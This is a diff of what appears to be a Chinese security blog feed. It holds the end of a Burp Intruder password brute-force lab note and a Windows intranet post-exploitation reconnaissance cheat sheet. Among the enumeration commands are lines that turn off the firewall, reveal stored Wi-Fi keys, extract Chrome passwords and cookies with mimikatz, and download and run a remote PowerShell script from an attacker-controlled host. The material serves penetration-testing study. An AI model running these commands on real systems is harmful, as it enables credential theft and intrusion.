src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.png"></p>
+<h4 id="3-Intruder-模块"><a href="#3-Intruder-模块" class="headerlink" title="3. Intruder 模块"></a>3. Intruder 模块</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
+<ol>
+<li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</p>
+</li>
+<li><p>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</p>
+</li>
+<li><p>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
+</li>
+</ol>
+<h5 id="1-抓取登录框的数据包，并将数据包发送至Intruder模块"><a href="#1-抓取登录框的数据包，并将数据包发送至Intruder模块" class="headerlink" title="(1)  抓取登录框的数据包，并将数据包发送至Intruder模块"></a>(1)  抓取登录框的数据包，并将数据包发送至Intruder模块</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.png"></p>
+<h5 id="2-将需要爆破的参数标记"><a href="#2-将需要爆破的参数标记" class="headerlink" title="(2)  将需要爆破的参数标记"></a>(2)  将需要爆破的参数标记</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.png"></p>
+<h5 id="3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"><a href="#3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破" class="headerlink" title="(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"></a>(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/18.png"></p>
+<h5 id="4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it"><a href="#4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it" class="headerlink" title="(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it"></a>(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/19.png"></p>
+<h5 id="5-返回网页，使用-用户名hetian-密码69-成功登录"><a href="#5-返回网页，使用-用户名hetian-密码69-成功登录" class="headerlink" title="(5)  返回网页，使用 用户名hetian 密码69 成功登录"></a>(5)  返回网页，使用 用户名hetian 密码69 成功登录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>实验笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows主机信息收集</title>
+    <url>/2021/02/25/Windows%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h2 id="0x00-什么是内网渗透"><a href="#0x00-什么是内网渗透" class="headerlink" title="0x00  什么是内网渗透"></a>0x00  什么是内网渗透</h2><p>在拿到webshell的时候，想办法获得系统信息拿到系统权限，进入到网络系统内部之后收集内部网络的各种 信息，获取内部网络有价值的人员、资产信息</p>
+<ol>
+<li><p>内网基础环境判断</p>
+<p>IP、网关、DNS、是否能连通外网、网络连接及端口、本机host文件、机器的代理、是否在域内，域名是什么</p>
+</li>
+<li><p>分析机器所处位置区域 </p>
+<p>DMZ区、办公区、生产区、核心DB等等</p>
+</li>
+<li><p>分析机器的角色 </p>
+<p>普通WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据存储服务器等等</p>
+</li>
+<li><p>分析进出口流量是否能连通 </p>
+<p>协议的判断：常见的TCP、DNS、HTTP、ICMP等协议 端口判断：外网vps做监听，内网机器测试常见端口，常见能出去的端口有80,8080,443,53,110,123 等。</p>
+</li>
+</ol>
+<span id="more"></span>
+
+<h2 id="0x01-常见名词解释"><a href="#0x01-常见名词解释" class="headerlink" title="0x01  常见名词解释"></a>0x01  常见名词解释</h2><h4 id="1-工作组"><a href="#1-工作组" class="headerlink" title="1. 工作组"></a>1. 工作组</h4><p><strong>工作组</strong><code>Work Group</code>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
+<p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p>
+<p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
+<p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p>
+<ol>
+<li>默认情况下所有计算机都处在名为WORKGROUP的工作组中 </li>
+<li>工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。 </li>
+<li>它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共 享。 </li>
+<li>相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是 Users 目录。</li>
+<li>不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。 </li>
+<li>所以工作组并不存在真正的集中管理作用,工作组里的所有计算机都是对等的,也就是没有服务器和客户机之分的。</li>
+</ol>
+<h3 id="2-域"><a href="#2-域" class="headerlink" title="2.  域"></a>2.  域</h3><h4 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域  Domain"></a>域  <code>Domain</code></h4><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p>
+<p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p>
+<h4 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器  Domain Controller"></a>域控制器  <code>Domain Controller</code></h4><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
+<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
+<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
+<p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
+<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
+<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
+<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p>
+<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p>
+<p>多个域树可以组成一个域林。</p>
+<h4 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h4><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
+<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
+<p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p>
+<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
+<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
+<h3 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3.  活动目录"></a>3.  活动目录</h3><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p>
+<p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p>
+<p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p>
+<h3 id="4-DMZ"><a href="#4-DMZ" class="headerlink" title="4.  DMZ"></a>4.  DMZ</h3><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
+<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
+<h3 id="5-域内的各种权限"><a href="#5-域内的各种权限" class="headerlink" title="5.  域内的各种权限"></a>5.  域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
+<p><strong>域本地组</strong></p>
+<p>成员范围：所有的域；使用范围：自己所在的域</p>
+<p><strong>全局组</strong></p>
+<p>成员范围：自己所在的域；使用范围：所有的域</p>
+<p><strong>通用组</strong></p>
+<p>成员范围：所有的域；使用范围：所有的域</p>
+<p><strong>A-G-DL-P 策略</strong></p>
+<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
+<ul>
+<li>A 表示用户账号</li>
+<li>G 表示全局组</li>
+<li>U 表示通用组</li>
+<li>DL 表示域本地组</li>
+<li>P 表示资源权限</li>
+</ul>
+<h2 id="0x02-工作组信息收集"><a href="#0x02-工作组信息收集" class="headerlink" title="0x02  工作组信息收集"></a>0x02  工作组信息收集</h2><h4 id="1-用户信息收集"><a href="#1-用户信息收集" class="headerlink" title="1.  用户信息收集"></a>1.  用户信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看本机用户列表</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line"></span><br><span class="line">#获取本地管理员信息</span><br><span class="line"><span class="built_in">net</span> localgroup administrators</span><br><span class="line"></span><br><span class="line">#查看当前在线用户和会话</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">query user || qwinsta</span><br><span class="line"></span><br><span class="line">#查当前用户在目标系统中的具体权限</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">#查看当前权限</span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line"></span><br><span class="line">#查当前机器中所有的组名,了解不同组的职能,如</span><br><span class="line">IT,HR,ADMIN,FILE</span><br><span class="line"><span class="built_in">net</span> localgroup</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-系统信息收集"><a href="#2-系统信息收集" class="headerlink" title="2.  系统信息收集"></a>2.  系统信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查询网络配置信息。进行IP地址段信息收集</span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询操作系统及软件信息</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 英文系统</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; #中文系统</span><br><span class="line"></span><br><span class="line">#查看当前系统版本</span><br><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br><span class="line"></span><br><span class="line">#查看系统体系结构</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%PROCESSOR_ARCHITECTURE%</span></span><br><span class="line"></span><br><span class="line">#查询本机服务信息</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">#查看安装的软件的版本、路径等</span><br><span class="line">wmic product get name, version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line"></span><br><span class="line">#查询进程信息</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"></span><br><span class="line">#查看启动程序信息</span><br><span class="line">wmic startup get command,caption</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line"><span class="built_in">at</span>（before win10）</span><br><span class="line">schtasks /query /fo LIST /v（win10）</span><br><span class="line"></span><br><span class="line">#查看主机开机时间</span><br><span class="line"><span class="built_in">net</span> statistics workstation</span><br><span class="line"></span><br><span class="line">#列出或断开本地计算机与所连接的客户端的对话</span><br><span class="line"><span class="built_in">net</span> session</span><br><span class="line"></span><br><span class="line">#查看远程连接信息</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看补丁列表</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> KB</span><br><span class="line"></span><br><span class="line">#查看补丁的名称、描述、ID、安装时间等</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看杀软</span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 <span class="built_in">Path</span> AntiVirusProduct Get displayName/<span class="built_in">Format</span>:List</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-网络信息收集"><a href="#3-网络信息收集" class="headerlink" title="3.  网络信息收集"></a>3.  网络信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat -anob</span><br><span class="line"></span><br><span class="line">#查看路由表和arp缓存</span><br><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">#查看本机共享列表和可访问的域共享列表 （<span class="number">445</span>端口）</span><br><span class="line"><span class="built_in">net</span> share</span><br><span class="line">wmic share get name,<span class="built_in">path</span>,status</span><br><span class="line"></span><br><span class="line">#磁盘映射</span><br><span class="line"><span class="built_in">net</span> use k: \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">10</span>\c$</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-防火墙信息收集"><a href="#4-防火墙信息收集" class="headerlink" title="4.  防火墙信息收集"></a>4.  防火墙信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以前的版本)</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable</span><br><span class="line"></span><br><span class="line">#关闭防火墙(Windows Server <span class="number">2003</span> 以后的版本)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"></span><br><span class="line">#查看防火墙配置(netsh命令也可以用作端口转发)</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line">#查看配置规则</span><br><span class="line">netsh advfirewall firewall show rule name=all</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-代理信息收集"><a href="#5-代理信息收集" class="headerlink" title="5.  代理信息收集"></a>5.  代理信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">ProxyServer</span><br><span class="line"></span><br><span class="line">#通过pac文件自动代理情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v</span><br><span class="line">AutoConfigURL</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-其他信息收集"><a href="#6-其他信息收集" class="headerlink" title="6.  其他信息收集"></a>6.  其他信息收集</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#wifi密码</span><br><span class="line">netsh wlan show profile</span><br><span class="line">netsh wlan show profile name=&quot;EEFUNG&quot; key=clear</span><br><span class="line"></span><br><span class="line">#回收站内容获取</span><br><span class="line"><span class="keyword">FOR</span> /f &quot;skip=<span class="number">1</span> tokens=<span class="number">1</span>,<span class="number">2</span> delims= &quot; %c <span class="keyword">in</span> (&#x27;wmic useraccount get name^,sid&#x27;) <span class="keyword">do</span> <span class="built_in">dir</span> /a /b</span><br><span class="line"><span class="function">C:\$<span class="title">Recycle.Bin</span>\%<span class="title">d</span>\ ^&gt;%<span class="title">c.txt</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">C</span>:\$<span class="title">Recycle.Bin</span>\<span class="title">S</span>-1-5-21-3845785564-1101086751-683477353-1001\</span></span><br><span class="line"><span class="function">#$<span class="title">I</span> 开头的文件保存的是路径信息</span></span><br><span class="line"><span class="function">#$<span class="title">R</span> 开头的文件保存的是文件内容</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#<span class="title">Chrome</span>历史记录和<span class="title">Cookie</span>获取</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">LOGIND</span>~1</span></span><br><span class="line"><span class="function">%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span></span></span><br><span class="line"><span class="function">#<span class="title">chrome</span>的用户信息，保存在本地文件为<span class="title">sqlite</span> 数据库格式</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">LOGIND</span>~1&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> <span class="title">privilege</span>::<span class="title">debug</span> <span class="title">log</span> &quot;<span class="title">dpapi</span>::<span class="title">chrome</span></span></span><br><span class="line"><span class="function">/<span class="title">in</span>:%<span class="title">localappdata</span>%\<span class="title">google</span>\<span class="title">chrome</span>\<span class="title">USERDA</span>~1\<span class="title">default</span>\<span class="title">cookies</span> /<span class="title">unprotect</span>&quot; <span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h6><p>Nishang-Gather-Get-Information.ps1</p>
+<p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</a></p>
+<p>脚本上传至VPS，开启HTTP让目标机器执行命令访问请求脚本</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://ip:port/GetInformation.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure>
+
+<h6 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#scraper</span><br><span class="line">Meterpreter &gt; run scraper</span><br><span class="line">/root/.msf4/logs/scripts/scraper</span><br><span class="line"></span><br><span class="line">#winenum</span><br><span class="line">Meterpreter &gt; run winenum</span><br><span class="line">/root/.msf4/logs/scripts/winenum</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-域内信息收集"><a href="#0x03-域内信息收集" class="headerlink" title="0x03  域内信息收集"></a>0x03  域内信息收集</h2><h4 id="1-Net组件"><a href="#1-Net组件" class="headerlink" title="1.  Net组件"></a>1.  Net组件</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查询域</span><br><span class="line"><span class="built_in">net</span> view /domain</span><br><span class="line"></span><br><span class="line">#查询域内的所有计算机</span><br><span class="line"><span class="built_in">net</span> view /domain:de1ay</span><br><span class="line"></span><br><span class="line">#查询域内所有用户组（Enterprise Admins组权限最大）</span><br><span class="line"><span class="built_in">net</span> group /domain</span><br><span class="line"></span><br><span class="line">#查看域管理员的用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询所有域成员计算机列表</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br><span class="line"></span><br><span class="line">#查询域系统管理员用户组</span><br><span class="line"><span class="built_in">net</span> group &quot;Enterprise admins&quot; /domain</span><br><span class="line"></span><br><span class="line">#查看域控制器</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line">#对比查看&quot;工作站域DNS名称(域名)&quot;和&quot;登录域()域控制器&quot;的信息是否相匹配</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#查看域内所有账号</span><br><span class="line"><span class="built_in">net</span> user /domain</span><br><span class="line"></span><br><span class="line">#查询指定用户的详情信息</span><br><span class="line"><span class="built_in">net</span> user xxx /domain</span><br><span class="line"></span><br><span class="line">#查看时间可以找到域控</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line">#查看域密码策略</span><br><span class="line"><span class="built_in">net</span> accounts /domain</span><br><span class="line"></span><br><span class="line">#查看当前登录域</span><br><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"></span><br><span class="line">#登录本机的域管理员</span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-dsquery"><a href="#2-dsquery" class="headerlink" title="2.  dsquery"></a>2.  dsquery</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">#查看当前域中的所有账户名</span><br><span class="line">dsquery user</span><br><span class="line"></span><br><span class="line">#查看当前域内的所有组名</span><br><span class="line">dsquery group</span><br><span class="line"></span><br><span class="line">#查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery subnet</span><br><span class="line"></span><br><span class="line">#查看域内所有的web站点</span><br><span class="line">dsquery site</span><br><span class="line"></span><br><span class="line">#查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery server</span><br><span class="line"></span><br><span class="line">#查询前<span class="number">240</span>个以admin开头的用户名</span><br><span class="line">dsquery user domainroot -name admin* -limit <span class="number">240</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-定位域控"><a href="#3-定位域控" class="headerlink" title="3.  定位域控"></a>3.  定位域控</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">ipconfig</span></span><br><span class="line"><span class="built_in">ipconfig</span> /all</span><br><span class="line"></span><br><span class="line">#查询dns解析记录</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.de1ay.com</span><br><span class="line"></span><br><span class="line">#spn扫描</span><br><span class="line">#在SPN扫描结果中可以通过如下内容，来进行域控的定位。</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -T de1ay.com -q */*</span><br><span class="line">CN=DC,OU=Domain Controllers,DC=de1ay,DC=com</span><br><span class="line"></span><br><span class="line">#<span class="built_in">net</span> group</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<h6 id="端口识别"><a href="#端口识别" class="headerlink" title="端口识别"></a>端口识别</h6><p>端口：389 </p>
+<p>服务：LDAP、ILS </p>
+<p>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
+<p>端口：53 </p>
+<p>服务：Domain Name Server（DNS） </p>
+<p>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT 系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</p>
+<h4 id="4-Other"><a href="#4-Other" class="headerlink" title="4.  Other"></a>4.  Other</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看域内信任关系</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line">#查看域控制器的机器名</span><br><span class="line">nltest /DCLIST:de1ay</span><br><span class="line"></span><br><span class="line">#查看域内邮件服务器</span><br><span class="line">nslookup -q=mx de1ay.com</span><br><span class="line"></span><br><span class="line">#查看域内DNS服务器</span><br><span class="line">nslookup -q=ns de1ay.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-内网存活探测"><a href="#0x04-内网存活探测" class="headerlink" title="0x04  内网存活探测"></a>0x04  内网存活探测</h2><h4 id="1-Netbios协议探测"><a href="#1-Netbios协议探测" class="headerlink" title="1.  Netbios协议探测"></a>1.  Netbios协议探测</h4><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接 口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统 可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名 称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源 的共享</p>
+<h6 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sU -T4 --script nbstat.nse -p137 <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>
+
+<h6 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h6><p>项目地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a> </p>
+<p>使用nbtscan扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器 输出的结果第一列为IP地址，第二列为机器名和所在域的名称，第三列即最后一列为及其所开启的服务的列表</p>
+<h6 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nbtscan.exe –m <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">nbtstat –n</span><br></pre></td></tr></table></figure>
+
+<h6 id="Lunix"><a href="#Lunix" class="headerlink" title="Lunix"></a>Lunix</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nbtscan -r <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
